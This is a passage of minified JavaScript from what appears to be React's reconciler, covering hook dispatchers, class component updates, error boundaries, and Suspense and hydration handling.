t=="function"){e=e();var a=t(e);return function(){typeof a=="function"?a():t(null)}}if(t!=null)return e=e(),t.current=e,function(){t.current=null}}function ju(e,t,a){a=a!=null?a.concat([e]):null,Es(4,4,Bu.bind(null,t,e),a)}function Oo(){}function Hu(e,t){var a=Le();t=t===void 0?null:t;var n=a.memoizedState;return t!==null&&yo(t,n[1])?n[0]:(a.memoizedState=[e,t],e)}function Gu(e,t){var a=Le();t=t===void 0?null:t;var n=a.memoizedState;if(t!==null&&yo(t,n[1]))return n[0];if(n=e(),Xa){la(!0);try{e()}finally{la(!1)}}return a.memoizedState=[n,t],n}function Do(e,t,a){return a===void 0||(It&1073741824)!==0&&(ue&261930)===0?e.memoizedState=t:(e.memoizedState=a,e=Qd(),ee.lanes|=e,va|=e,a)}function Qu(e,t,a,n){return ut(a,t)?a:Tn.current!==null?(e=Do(e,a,n),ut(e,t)||(Be=!0),e):(It&42)===0||(It&1073741824)!==0&&(ue&261930)===0?(Be=!0,e.memoizedState=a):(e=Qd(),ee.lanes|=e,va|=e,t)}function Yu(e,t,a,n,l){var s=z.p;z.p=s!==0&&8>s?s:8;var i=A.T,c={};A.T=c,Mo(e,!1,t,a);try{var d=l(),E=A.S;if(E!==null&&E(c,d),d!==null&&typeof d=="object"&&typeof d.then=="function"){var D=Yp(d,n);ml(e,t,D,gt(e))}else ml(e,t,n,gt(e))}catch(M){ml(e,t,{then:function(){},status:"rejected",reason:M},gt())}finally{z.p=s,i!==null&&c.types!==null&&(i.types=c.types),A.T=i}}function $p(){}function ko(e,t,a,n){if(e.tag!==5)throw Error(r(476));var l=Ku(e).queue;Yu(e,l,t,H,a===null?$p:function(){return Vu(e),a(n)})}function Ku(e){var t=e.memoizedState;if(t!==null)return t;t={memoizedState:H,baseState:H,baseQueue:null,queue:{pending:null,lanes:0,dispatch:null,lastRenderedReducer:Zt,lastRenderedState:H},next:null};var a={};return t.next={memoizedState:a,baseState:a,baseQueue:null,queue:{pending:null,lanes:0,dispatch:null,lastRenderedReducer:Zt,lastRenderedState:a},next:null},e.memoizedState=t,e=e.alternate,e!==null&&(e.memoizedState=t),t}function Vu(e){var t=Ku(e);t.next===null&&(t=e.alternate.memoizedState),ml(e,t.next.queue,{},gt())}function wo(){return $e(kl)}function Xu(){return Le().memoizedState}function Iu(){return Le().memoizedState}function Wp(e){for(var t=e.return;t!==null;){switch(t.tag){case 24:case 3:var a=gt();e=fa(a);var n=ma(t,e,a);n!==null&&(it(n,t,a),cl(n,t,a)),t={cache:so()},e.payload=t;return}t=t.return}}function Jp(e,t,a){var n=gt();a={lane:n,revertLane:0,gesture:null,action:a,hasEagerState:!1,eagerState:null,next:null},Ts(e)?$u(t,a):(a=Zi(e,t,a,n),a!==null&&(it(a,e,n),Wu(a,t,n)))}function Zu(e,t,a){var n=gt();ml(e,t,a,n)}function ml(e,t,a,n){var l={lane:n,revertLane:0,gesture:null,action:a,hasEagerState:!1,eagerState:null,next:null};if(Ts(e))$u(t,l);else{var s=e.alternate;if(e.lanes===0&&(s===null||s.lanes===0)&&(s=t.lastRenderedReducer,s!==null))try{var i=t.lastRenderedState,c=s(i,a);if(l.hasEagerState=!0,l.eagerState=c,ut(c,i))return as(e,t,l,0),Te===null&&ts(),!1}catch{}finally{}if(a=Zi(e,t,l,n),a!==null)return it(a,e,n),Wu(a,t,n),!0}return!1}function Mo(e,t,a,n){if(n={lane:2,revertLane:uc(),gesture:null,action:n,hasEagerState:!1,eagerState:null,next:null},Ts(e)){if(t)throw Error(r(479))}else t=Zi(e,a,n,2),t!==null&&it(t,e,2)}function Ts(e){var t=e.alternate;return e===ee||t!==null&&t===ee}function $u(e,t){_n=hs=!0;var a=e.pending;a===null?t.next=t:(t.next=a.next,a.next=t),e.pending=t}function Wu(e,t,a){if((a&4194048)!==0){var n=t.lanes;n&=e.pendingLanes,a|=n,t.lanes=a,tr(e,a)}}var pl={readContext:$e,use:vs,useCallback:ke,useContext:ke,useEffect:ke,useImperativeHandle:ke,useLayoutEffect:ke,useInsertionEffect:ke,useMemo:ke,useReducer:ke,useRef:ke,useState:ke,useDebugValue:ke,useDeferredValue:ke,useTransition:ke,useSyncExternalStore:ke,useId:ke,useHostTransitionStatus:ke,useFormState:ke,useActionState:ke,useOptimistic:ke,useMemoCache:ke,useCacheRefresh:ke};pl.useEffectEvent=ke;var Ju={readContext:$e,use:vs,useCallback:function(e,t){return Fe().memoizedState=[e,t===void 0?null:t],e},useContext:$e,useEffect:Nu,useImperativeHandle:function(e,t,a){a=a!=null?a.concat([e]):null,bs(4194308,4,Bu.bind(null,t,e),a)},useLayoutEffect:function(e,t){return bs(4194308,4,e,t)},useInsertionEffect:function(e,t){bs(4,2,e,t)},useMemo:function(e,t){var a=Fe();t=t===void 0?null:t;var n=e();if(Xa){la(!0);try{e()}finally{la(!1)}}return a.memoizedState=[n,t],n},useReducer:function(e,t,a){var n=Fe();if(a!==void 0){var l=a(t);if(Xa){la(!0);try{a(t)}finally{la(!1)}}}else l=t;return n.memoizedState=n.baseState=l,e={pending:null,lanes:0,dispatch:null,lastRenderedReducer:e,lastRenderedState:l},n.queue=e,e=e.dispatch=Jp.bind(null,ee,e),[n.memoizedState,e]},useRef:function(e){var t=Fe();return e={current:e},t.memoizedState=e},useState:function(e){e=Ao(e);var t=e.queue,a=Zu.bind(null,ee,t);return t.dispatch=a,[e.memoizedState,a]},useDebugValue:Oo,useDeferredValue:function(e,t){var a=Fe();return Do(a,e,t)},useTransition:function(){var e=Ao(!1);return e=Yu.bind(null,ee,e.queue,!0,!1),Fe().memoizedState=e,[!1,e]},useSyncExternalStore:function(e,t,a){var n=ee,l=Fe();if(fe){if(a===void 0)throw Error(r(407));a=a()}else{if(a=t(),Te===null)throw Error(r(349));(ue&127)!==0||vu(n,t,a)}l.memoizedState=a;var s={value:a,getSnapshot:t};return l.queue=s,Nu(bu.bind(null,n,s,e),[e]),n.flags|=2048,An(9,{destroy:void 0},Su.bind(null,n,s,a,t),null),a},useId:function(){var e=Fe(),t=Te.identifierPrefix;if(fe){var a=Nt,n=Lt;a=(n&~(1<<32-rt(n)-1)).toString(32)+a,t="_"+t+"R_"+a,a=gs++,0<a&&(t+="H"+a.toString(32)),t+="_"}else a=Kp++,t="_"+t+"r_"+a.toString(32)+"_";return e.memoizedState=t},useHostTransitionStatus:wo,useFormState:Du,useActionState:Du,useOptimistic:function(e){var t=Fe();t.memoizedState=t.baseState=e;var a={pending:null,lanes:0,dispatch:null,lastRenderedReducer:null,lastRenderedState:null};return t.queue=a,t=Mo.bind(null,ee,!0,a),a.dispatch=t,[e,t]},useMemoCache:To,useCacheRefresh:function(){return Fe().memoizedState=Wp.bind(null,ee)},useEffectEvent:function(e){var t=Fe(),a={impl:e};return t.memoizedState=a,function(){if((he&2)!==0)throw Error(r(440));return a.impl.apply(void 0,arguments)}}},Lo={readContext:$e,use:vs,useCallback:Hu,useContext:$e,useEffect:Co,useImperativeHandle:ju,useInsertionEffect:Uu,useLayoutEffect:zu,useMemo:Gu,useReducer:Ss,useRef:Lu,useState:function(){return Ss(Zt)},useDebugValue:Oo,useDeferredValue:function(e,t){var a=Le();return Qu(a,Se.memoizedState,e,t)},useTransition:function(){var e=Ss(Zt)[0],t=Le().memoizedState;return[typeof e=="boolean"?e:fl(e),t]},useSyncExternalStore:yu,useId:Xu,useHostTransitionStatus:wo,useFormState:ku,useActionState:ku,useOptimistic:function(e,t){var a=Le();return _u(a,Se,e,t)},useMemoCache:To,useCacheRefresh:Iu};Lo.useEffectEvent=qu;var Pu={readContext:$e,use:vs,useCallback:Hu,useContext:$e,useEffect:Co,useImperativeHandle:ju,useInsertionEffect:Uu,useLayoutEffect:zu,useMemo:Gu,useReducer:Ro,useRef:Lu,useState:function(){return Ro(Zt)},useDebugValue:Oo,useDeferredValue:function(e,t){var a=Le();return Se===null?Do(a,e,t):Qu(a,Se.memoizedState,e,t)},useTransition:function(){var e=Ro(Zt)[0],t=Le().memoizedState;return[typeof e=="boolean"?e:fl(e),t]},useSyncExternalStore:yu,useId:Xu,useHostTransitionStatus:wo,useFormState:Mu,useActionState:Mu,useOptimistic:function(e,t){var a=Le();return Se!==null?_u(a,Se,e,t):(a.baseState=e,[e,a.queue.dispatch])},useMemoCache:To,useCacheRefresh:Iu};Pu.useEffectEvent=qu;function No(e,t,a,n){t=e.memoizedState,a=a(n,t),a=a==null?t:O({},t,a),e.memoizedState=a,e.lanes===0&&(e.updateQueue.baseState=a)}var qo={enqueueSetState:function(e,t,a){e=e._reactInternals;var n=gt(),l=fa(n);l.payload=t,a!=null&&(l.callback=a),t=ma(e,l,n),t!==null&&(it(t,e,n),cl(t,e,n))},enqueueReplaceState:function(e,t,a){e=e._reactInternals;var n=gt(),l=fa(n);l.tag=1,l.payload=t,a!=null&&(l.callback=a),t=ma(e,l,n),t!==null&&(it(t,e,n),cl(t,e,n))},enqueueForceUpdate:function(e,t){e=e._reactInternals;var a=gt(),n=fa(a);n.tag=2,t!=null&&(n.callback=t),t=ma(e,n,a),t!==null&&(it(t,e,a),cl(t,e,a))}};function Fu(e,t,a,n,l,s,i){return e=e.stateNode,typeof e.shouldComponentUpdate=="function"?e.shouldComponentUpdate(n,s,i):t.prototype&&t.prototype.isPureReactComponent?!el(a,n)||!el(l,s):!0}function ed(e,t,a,n){e=t.state,typeof t.componentWillReceiveProps=="function"&&t.componentWillReceiveProps(a,n),typeof t.UNSAFE_componentWillReceiveProps=="function"&&t.UNSAFE_componentWillReceiveProps(a,n),t.state!==e&&qo.enqueueReplaceState(t,t.state,null)}function Ia(e,t){var a=t;if("ref"in t){a={};for(var n in t)n!=="ref"&&(a[n]=t[n])}if(e=e.defaultProps){a===t&&(a=O({},a));for(var l in e)a[l]===void 0&&(a[l]=e[l])}return a}function td(e){es(e)}function ad(e){console.error(e)}function nd(e){es(e)}function _s(e,t){try{var a=e.onUncaughtError;a(t.value,{componentStack:t.stack})}catch(n){setTimeout(function(){throw n})}}function ld(e,t,a){try{var n=e.onCaughtError;n(a.value,{componentStack:a.stack,errorBoundary:t.tag===1?t.stateNode:null})}catch(l){setTimeout(function(){throw l})}}function Uo(e,t,a){return a=fa(a),a.tag=3,a.payload={element:null},a.callback=function(){_s(e,t)},a}function sd(e){return e=fa(e),e.tag=3,e}function id(e,t,a,n){var l=a.type.getDerivedStateFromError;if(typeof l=="function"){var s=n.value;e.payload=function(){return l(s)},e.callback=function(){ld(t,a,n)}}var i=a.stateNode;i!==null&&typeof i.componentDidCatch=="function"&&(e.callback=function(){ld(t,a,n),typeof l!="function"&&(Sa===null?Sa=new Set([this]):Sa.add(this));var c=n.stack;this.componentDidCatch(n.value,{componentStack:c!==null?c:""})})}function Pp(e,t,a,n,l){if(a.flags|=32768,n!==null&&typeof n=="object"&&typeof n.then=="function"){if(t=a.alternate,t!==null&&yn(t,a,l,!0),a=ft.current,a!==null){switch(a.tag){case 31:case 13:return At===null?qs():a.alternate===null&&we===0&&(we=3),a.flags&=-257,a.flags|=65536,a.lanes=l,n===us?a.flags|=16384:(t=a.updateQueue,t===null?a.updateQueue=new Set([n]):t.add(n),oc(e,n,l)),!1;case 22:return a.flags|=65536,n===us?a.flags|=16384:(t=a.updateQueue,t===null?(t={transitions:null,markerInstances:null,retryQueue:new Set([n])},a.updateQueue=t):(a=t.retryQueue,a===null?t.retryQueue=new Set([n]):a.add(n)),oc(e,n,l)),!1}throw Error(r(435,a.tag))}return oc(e,n,l),qs(),!1}if(fe)return t=ft.current,t!==null?((t.flags&65536)===0&&(t.flags|=256),t.flags|=65536,t.lanes=l,n!==eo&&(e=Error(r(422),{cause:n}),nl(Et(e,a)))):(n!==eo&&(t=Error(r(423),{cause:n}),nl(Et(t,a))),e=e.current.alternate,e.flags|=65536,l&=-l,e.lanes|=l,n=Et(n,a),l=Uo(e.stateNode,n,l),fo(e,l),we!==4&&(we=2)),!1;var s=Error(r(520),{cause:n});if(s=Et(s,a),Tl===null?Tl=[s]:Tl.push(s),we!==4&&(we=2),t===null)return!0;n=Et(n,a),a=t;do{switch(a.tag){case 3:return a.flags|=65536,e=l&-l,a.lanes|=e,e=Uo(a.stateNode,n,e),fo(a,e),!1;case 1:if(t=a.type,s=a.stateNode,(a.flags&128)===0&&(typeof t.getDerivedStateFromError=="function"||s!==null&&typeof s.componentDidCatch=="function"&&(Sa===null||!Sa.has(s))))return a.flags|=65536,l&=-l,a.lanes|=l,l=sd(l),id(l,e,a,n),fo(a,l),!1}a=a.return}while(a!==null);return!1}var zo=Error(r(461)),Be=!1;function We(e,t,a,n){t.child=e===null?uu(t,null,a,n):Va(t,e.child,a,n)}function od(e,t,a,n,l){a=a.render;var s=t.ref;if("ref"in n){var i={};for(var c in n)c!=="ref"&&(i[c]=n[c])}else i=n;return Ga(t),n=vo(e,t,a,i,s,l),c=So(),e!==null&&!Be?(bo(e,t,l),$t(e,t,l)):(fe&&c&&Pi(t),t.flags|=1,We(e,t,n,l),t.child)}function cd(e,t,a,n,l){if(e===null){var s=a.type;return typeof s=="function"&&!$i(s)&&s.defaultProps===void 0&&a.compare===null?(t.tag=15,t.type=s,rd(e,t,s,n,l)):(e=ls(a.type,null,n,t,t.mode,l),e.ref=t.ref,e.return=t,t.child=e)}if(s=e.child,!Vo(e,l)){var i=s.memoizedProps;if(a=a.compare,a=a!==null?a:el,a(i,n)&&e.ref===t.ref)return $t(e,t,l)}return t.flags|=1,e=Yt(s,n),e.ref=t.ref,e.return=t,t.child=e}function rd(e,t,a,n,l){if(e!==null){var s=e.memoizedProps;if(el(s,n)&&e.ref===t.ref)if(Be=!1,t.pendingProps=n=s,Vo(e,l))(e.flags&131072)!==0&&(Be=!0);else return t.lanes=e.lanes,$t(e,t,l)}return Bo(e,t,a,n,l)}function ud(e,t,a,n){var l=n.children,s=e!==null?e.memoizedState:null;if(e===null&&t.stateNode===null&&(t.stateNode={_visibility:1,_pendingMarkers:null,_retryCache:null,_transitions:null}),n.mode==="hidden"){if((t.flags&128)!==0){if(s=s!==null?s.baseLanes|a:a,e!==null){for(n=t.child=e.child,l=0;n!==null;)l=l|n.lanes|n.childLanes,n=n.sibling;n=l&~s}else n=0,t.child=null;return dd(e,t,s,a,n)}if((a&536870912)!==0)t.memoizedState={baseLanes:0,cachePool:null},e!==null&&cs(t,s!==null?s.cachePool:null),s!==null?mu(t,s):po(),pu(t);else return n=t.lanes=536870912,dd(e,t,s!==null?s.baseLanes|a:a,a,n)}else s!==null?(cs(t,s.cachePool),mu(t,s),ha(),t.memoizedState=null):(e!==null&&cs(t,null),po(),ha());return We(e,t,l,a),t.child}function hl(e,t){return e!==null&&e.tag===22||t.stateNode!==null||(t.stateNode={_visibility:1,_pendingMarkers:null,_retryCache:null,_transitions:null}),t.sibling}function dd(e,t,a,n,l){var s=oo();return s=s===null?null:{parent:Ue._currentValue,pool:s},t.memoizedState={baseLanes:a,cachePool:s},e!==null&&cs(t,null),po(),pu(t),e!==null&&yn(e,t,n,!0),t.childLanes=l,null}function Rs(e,t){return t=xs({mode:t.mode,children:t.children},e.mode),t.ref=e.ref,e.child=t,t.return=e,t}function fd(e,t,a){return Va(t,e.child,null,a),e=Rs(t,t.pendingProps),e.flags|=2,mt(t),t.memoizedState=null,e}function Fp(e,t,a){var n=t.pendingProps,l=(t.flags&128)!==0;if(t.flags&=-129,e===null){if(fe){if(n.mode==="hidden")return e=Rs(t,n),t.lanes=536870912,hl(null,e);if(go(t),(e=Ae)?(e=Af(e,Rt),e=e!==null&&e.data==="&"?e:null,e!==null&&(t.memoizedState={dehydrated:e,treeContext:oa!==null?{id:Lt,overflow:Nt}:null,retryLane:536870912,hydrationErrors:null},a=$r(e),a.return=t,t.child=a,Ze=t,Ae=null)):e=null,e===null)throw ra(t);return t.lanes=536870912,null}return Rs(t,n)}var s=e.memoizedState;if(s!==null){var i=s.dehydrated;if(go(t),l)if(t.flags&256)t.flags&=-257,t=fd(e,t,a);else if(t.memoizedState!==null)t.child=e.child,t.flags|=128,t=null;else throw Error(r(558));else if(Be||yn(e,t,a,!1),l=(a&e.childLanes)!==0,Be||l){if(n=Te,n!==null&&(i=ar(n,a),i!==0&&i!==s.retryLane))throw s.retryLane=i,za(e,i),it(n,e,i),zo;qs(),t=fd(e,t,a)}else e=s.treeContext,Ae=xt(i.nextSibling),Ze=t,fe=!0,ca=null,Rt=!1,e!==null&&Pr(t,e),t=Rs(t,n),t.flags|=4096;return t}return e=Yt(e.child,{mode:n.mode,children:n.children}),e.ref=t.ref,t.child=e,e.return=t,e}function As(e,t){var a=t.ref;if(a===null)e!==null&&e.ref!==null&&(t.flags|=4194816);else{if(typeof a!="function"&&typeof a!="object")throw Error(r(284));(e===null||e.ref!==a)&&(t.flags|=4194816)}}function Bo(e,t,a,n,l){return Ga(t),a=vo(e,t,a,n,void 0,l),n=So(),e!==null&&!Be?(bo(e,t,l),$t(e,t,l)):(fe&&n&&Pi(t),t.flags|=1,We(e,t,a,l),t.child)}function md(e,t,a,n,l,s){return Ga(t),t.updateQueue=null,a=gu(t,n,a,l),hu(e),n=So(),e!==null&&!Be?(bo(e,t,s),$t(e,t,s)):(fe&&n&&Pi(t),t.flags|=1,We(e,t,a,s),t.child)}function pd(e,t,a,n,l){if(Ga(t),t.stateNode===null){var s=mn,i=a.contextType;typeof i=="object"&&i!==null&&(s=$e(i)),s=new a(n,s),t.memoizedState=s.state!==null&&s.state!==void 0?s.state:null,s.updater=qo,t.stateNode=s,s._reactInternals=t,s=t.stateNode,s.props=n,s.state=t.memoizedState,s.refs={},ro(t),i=a.contextType,s.context=typeof i=="object"&&i!==null?$e(i):mn,s.state=t.memoizedState,i=a.getDerivedStateFromProps,typeof i=="function"&&(No(t,a,i,n),s.state=t.memoizedState),typeof a.getDerivedStateFromProps=="function"||typeof s.getSnapshotBeforeUpdate=="function"||typeof s.UNSAFE_componentWillMount!="function"&&typeof s.componentWillMount!="function"||(i=s.state,typeof s.componentWillMount=="function"&&s.componentWillMount(),typeof s.UNSAFE_componentWillMount=="function"&&s.UNSAFE_componentWillMount(),i!==s.state&&qo.enqueueReplaceState(s,s.state,null),ul(t,n,s,l),rl(),s.state=t.memoizedState),typeof s.componentDidMount=="function"&&(t.flags|=4194308),n=!0}else if(e===null){s=t.stateNode;var c=t.memoizedProps,d=Ia(a,c);s.props=d;var E=s.context,D=a.contextType;i=mn,typeof D=="object"&&D!==null&&(i=$e(D));var M=a.getDerivedStateFromProps;D=typeof M=="function"||typeof s.getSnapshotBeforeUpdate=="function",c=t.pendingProps!==c,D||typeof s.UNSAFE_componentWillReceiveProps!="function"&&typeof s.componentWillReceiveProps!="function"||(c||E!==i)&&ed(t,s,n,i),da=!1;var T=t.memoizedState;s.state=T,ul(t,n,s,l),rl(),E=t.memoizedState,c||T!==E||da?(typeof M=="function"&&(No(t,a,M,n),E=t.memoizedState),(d=da||Fu(t,a,d,n,T,E,i))?(D||typeof s.UNSAFE_componentWillMount!="function"&&typeof s.componentWillMount!="function"||(typeof s.componentWillMount=="function"&&s.componentWillMount(),typeof s.UNSAFE_componentWillMount=="function"&&s.UNSAFE_componentWillMount()),typeof s.componentDidMount=="function"&&(t.flags|=4194308)):(typeof s.componentDidMount=="function"&&(t.flags|=4194308),t.memoizedProps=n,t.memoizedState=E),s.props=n,s.state=E,s.context=i,n=d):(typeof s.componentDidMount=="function"&&(t.flags|=4194308),n=!1)}else{s=t.stateNode,uo(e,t),i=t.memoizedProps,D=Ia(a,i),s.props=D,M=t.pendingProps,T=s.context,E=a.contextType,d=mn,typeof E=="object"&&E!==null&&(d=$e(E)),c=a.getDerivedStateFromProps,(E=typeof c=="function"||typeof s.getSnapshotBeforeUpdate=="function")||typeof s.UNSAFE_componentWillReceiveProps!="function"&&typeof s.componentWillReceiveProps!="function"||(i!==M||T!==d)&&ed(t,s,n,d),da=!1,T=t.memoizedState,s.state=T,ul(t,n,s,l),rl();var _=t.memoizedState;i!==M||T!==_||da||e!==null&&e.dependencies!==null&&is(e.dependencies)?(typeof c=="function"&&(No(t,a,c,n),_=t.memoizedState),(D=da||Fu(t,a,D,n,T,_,d)||e!==null&&e.dependencies!==null&&is(e.dependencies))?(E||typeof s.UNSAFE_componentWillUpdate!="function"&&typeof s.componentWillUpdate!="function"||(typeof s.componentWillUpdate=="function"&&s.componentWillUpdate(n,_,d),typeof s.UNSAFE_componentWillUpdate=="function"&&s.UNSAFE_componentWillUpdate(n,_,d)),typeof s.componentDidUpdate=="function"&&(t.flags|=4),typeof s.getSnapshotBeforeUpdate=="function"&&(t.flags|=1024)):(typeof s.componentDidUpdate!="function"||i===e.memoizedProps&&T===e.memoizedState||(t.flags|=4),typeof s.getSnapshotBeforeUpdate!="function"||i===e.memoizedProps&&T===e.memoizedState||(t.flags|=1024),t.memoizedProps=n,t.memoizedState=_),s.props=n,s.state=_,s.context=d,n=D):(typeof s.componentDidUpdate!="function"||i===e.memoizedProps&&T===e.memoizedState||(t.flags|=4),typeof s.getSnapshotBeforeUpdate!="function"||i===e.memoizedProps&&T===e.memoizedState||(t.flags|=1024),n=!1)}return s=n,As(e,t),n=(t.flags&128)!==0,s||n?(s=t.stateNode,a=n&&typeof a.getDerivedStateFromError!="function"?null:s.render(),t.flags|=1,e!==null&&n?(t.child=Va(t,e.child,null,l),t.child=Va(t,null,a,l)):We(e,t,a,l),t.memoizedState=s.state,e=t.child):e=$t(e,t,l),e}function hd(e,t,a,n){return ja(),t.flags|=256,We(e,t,a,n),t.child}var jo={dehydrated:null,treeContext:null,retryLane:0,hydrationErrors:null};function Ho(e){return{baseLanes:e,cachePool:lu()}}function Go(e,t,a){return e=e!==null?e.childLanes&~a:0,t&&(e|=ht),e}function gd(e,t,a){var n=t.pendingProps,l=!1,s=(t.flags&128)!==0,i;if((i=s)||(i=e!==null&&e.memoizedState===null?!1:(Me.current&2)!==0),i&&(l=!0,t.flags&=-129),i=(t.flags&32)!==0,t.flags&=-33,e===null){if(fe){if(l?pa(t):ha(),(e=Ae)?(e=Af(e,Rt),e=e!==null&&e.data!=="&"?e:null,e!==null&&(t.memoizedState={dehydrated:e,treeContext:oa!==null?{id:Lt,overflow:Nt}:null,retryLane:536870912,hydrationErrors:null},a=$r(e),a.return=t,t.child=a,Ze=t,Ae=null)):e=null,e===null)throw ra(t);return _c(e)?t.lanes=32:t.lanes=536870912,null}var c=n.children;return n=n.fallback,l?(ha(),l=t.mode,c=xs({mode:"hidden",children:c},l),n=Ba(n,l,a,null),c.return=t,n.return=t,c.sibling=n,t.child=c,n=t.child,n.memoizedState=Ho(a),n.childLanes=Go(e,i,a),t.memoizedState=jo,hl(null,n)):(pa(t),Qo(t,c))}var d=e.memoizedState;if(d!==null&&(c=d.dehydrated,c!==null)){if(s)t.flags&256?(pa(t),t.flags&=-257,t=Yo(e,t,a)):t.memoizedState!==null?(ha(),t.child=e.child,t.flags|=128,t=null):(ha(),c=n.fallback,l=t.mode,n=xs({mode:"visible",children:n.children},l),c=Ba(c,l,a,null),c.flags|=2,n.return=t,c.return=t,n.sibling=c,t.child=n,Va(t,e.child,null,a),n=t.child,n.memoizedState=Ho(a),n.childLanes=Go(e,i,a),t.memoizedState=jo,t=hl(null,n));else if(pa(t),_c(c)){if(i=c.nextSibling&&c.nextSibling.dataset,i)var E=i.dgst;i=E,n=Error(r(419)),n.stack="",n.digest=i,nl({value:n,source:null,stack:null}),t=Yo(e,t,a)}else if(Be||yn(e,t,a,!1),i=(a&e.childLanes)!==0,Be||i){if(i=Te,i!==null&&(n=ar(i,a),n!==0&&n!==d.retryLane))throw d.retryLane=n,za(e,n),it(i,e,n),zo;Tc(c)||qs(),t=Yo(e,t,a)}else Tc(c)?(t.flags|=192,t.child=e.child,t=null):(e=d.treeContext,Ae=xt(c.nextSibling),Ze=t,fe=!0,ca=null,Rt=!1,e!==null&&Pr(t,e),t=Qo(t,n.children),t.flags|=4096);return t}return l?(ha(),c=n.fallback,l=t.mode,d=e.child,E=d.sibling,n=Yt(d,{mode:"hidden",children:n.children}),n.subtreeFlags=d.subtreeFlags&65011712,E!==null?c=Yt(E,c):(c=Ba(c,l,a,null),c.flags|=2),c.return=t,n.return=t,n.sibling=c,t.child=n,hl(null,n),n=t.child,c=e.child.memoizedState,c===null?c=Ho(a):(l=c.cachePool,l!==null?(d=Ue._currentValue,l=l.parent!==d?{parent:d,pool:d}:l):l=lu(),c={baseLanes:c.baseLanes|a,cachePool:l}),n.memoizedState=c,n.childLanes=Go(e,i,a),t.memoizedState=jo,hl(e.child,n)):(pa(t),a=e.child,e=a.sibling,a=Yt(a,{mode:"visible",children:n.children}),a.return=t,a.sibling=null,e!==null&&(i=t.deletions,i===null?(t.deletions=[e],t.flags|=16):i.push(e)),t.child=a,t.memoizedState=null,a)}function Qo(e,t){return t=xs({mode:"visible",children:t},e.mode),t.return=e,e.child=t}function xs(e,t){return e=dt(22,e,null,t),e.lanes=0,e}function Yo(e,t,a){return Va(t,e.child,null,a),e=Qo(t,t.pendingProps.children),e.flags|=2,t.memoizedState=null,e}function yd(e,t,a){e.lanes|=t;var n=e.alternate;n!==null&&(n.lanes|=t),no(e.return,t,a)}function Ko(e,t,a,n,l,s){var i=e.memoizedState;i===null?e.memoizedState={isBackwards:t,rendering:null,renderingStartTime:0,last:n,tail:a,tailMode:l,treeForkCount:s}:(i.isBackwards=t,i.rendering=null,i.renderingStartTime=0,i.last=n,i.tail=a,i.tailMode=l,i.treeForkCount=s)}function vd(e,t,a){var n=t.pendingProps,l=n.revealOrder,s=n.tail;n=n.children;var i=Me.current,c=(i&2)!==0;if(c?(i=i&1|2,t.flags|=128):i&=1,B(Me,i),We(e,t,n,a),n=fe?al:0,!c&&e!==null&&(e.flags&128)!==0)e:for(e=t.child;e!==null;){if(e.tag===13)e.memoizedState!==null&&yd(e,a,t);else if(e.tag===19)yd(e,a,t);else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===t)break e;for(;e.sibling===null;){if(e.return===null||e.return===t)break e;e=e.return}e.sibling.return=e.return,e=e.sibling}switch(l){case"forwards":for(a=t.child,l=null;a!==null;)e=a.alternate,e!==null&&ps(e)===null&&(l=a),a=a.sibling;a=l,a===null?(l=t.child,t.child=null):(l=a.sibling,a.sibling=null),Ko(t,!1,l,a,s,n);break;case"backwards":case"unstable_legacy-backwards":for(a=null,l=t.child,t.child=null;l!==null;){if(e=l.alternate,e!==null&&ps(e)===null){t.child=l;break}e=l.sibling,l.sibling=a,a=l,l=e}Ko(t,!0,a,null,s,n);break;case"together":Ko(t,!1,null,null,void 0,n);break;default:t.memoizedState=null}return t.child}function $t(e,t,a){if(e!==null&&(t.dependencies=e.dependencies),va|=t.lanes,(a&t.childLanes)===0)if(e!==null){if(yn(e,t,a,!1),(a&t.childLanes)===0)return null}else return null;if(e!==null&&t.child!==e.child)throw Error(r(153));if(t.child!==null){for(e=t.child,a=Yt(e,e.pendingProps),t.child=a,a.return=t;e.sibling!==null;)e=e.sibling,a=a.sibling=Yt(e,e.pendingProps),a.return=t;a.sibling=null}return t.child}function Vo(e,t){return(e.lanes&t)!==0?!0:(e=e.dependencies,!!(e!==null&&is(e)))}function eh(e,t,a){switch(t.tag){case 3:Qe(t,t.stateNode.containerInfo),ua(t,Ue,e.memoizedState.cache),ja();break;case 27:case 5:Gn(t);break;case 4:Qe(t,t.stateNode.containerInfo);break;case 10:ua(t,t.type,t.memoizedProps.value);break;case 31:if(t.memoizedState!==null)return t.flags|=128,go(t),null;break;case 13:var n=t.memoizedState;if(n!==null)return n.dehydrated!==null?(pa(t),t.flags|=128,null):(a&t.child.childLanes)!==0?gd(e,t,a):(pa(t),e=$t(e,t,a),e!==null?e.sibling:null);pa(t);break;case 19:var l=(e.flags&128)!==0;if(n=(a&t.childLanes)!==0,n||(yn(e,t,a,!1),n=(a&t.childLanes)!==0),l){if(n)return vd(e,t,a);t.flags|=128}if(l=t.memoizedState,l!==null&&(l.rendering=null,l.tail=null,l.lastEffect=null),B(Me,Me.current),n)break;return null;case 22:return t.lanes=0,ud(e,t,a,t.pendingProps);case 24:ua(t,Ue,e.memoizedState.cache)}return $t(e,t,a)}function Sd(e,t,a){if(e!==null)if(e.memoizedProps!==t.pendingProps)Be=!0;else{if(!Vo(e,a)&&(t.flags&128)===0)return Be=!1,eh(e,t,a);Be=(e.flags&131072)!==0}else Be=!1,fe&&(t.flags&1048576)!==0&&Jr(t,al,t.index);switch(t.lanes=0,t.tag){case 16:e:{var n=t.pendingProps;if(e=Ya(t.elementType),t.type=e,typeof e=="function")$i(e)?(n=Ia(e,n),t.tag=1,t=pd(null,t,e,n,a)):(t.tag=0,t=Bo(null,t,e,n,a));else{if(e!=null){var l=e.$$typeof;if(l===ie){t.tag=11,t=od(null,t,e,n,a);break e}else if(l===I){t.tag=14,t=cd(null,t,e,n,a);break e}}throw t=De(e)||e,Error(r(306,t,""))}}return t;case 0:return Bo(e,t,t.type,t.pendingProps,a);case 1:return n=t.type,l=Ia(n,t.pendingProps),pd(e,t,n,l,a);case 3:e:{if(Qe(t,t.stateNode.containerInfo),e===null)throw Error(r(387));n=t.pendingProps;var s=t.memoizedState;l=s.element,uo(e,t),ul(t,n,null,a);var i=t.memoizedState;if(n=i.cache,ua(t,Ue,n),n!==s.cache&&lo(t,[Ue],a,!0),rl(),n=i.element,s.isDehydrated)if(s={element:n,isDehydrated:!1,cache:i.cache},t.updateQueue.baseState=s,t.memoizedState=s,t.flags&256){t=hd(e,t,n,a);break e}else if(n!==l){l=Et(Error(r(424)),t),nl(l),t=hd(e,t,n,a);break e}else{switch(e=t.stateNode.containerInfo,e.nodeType){case 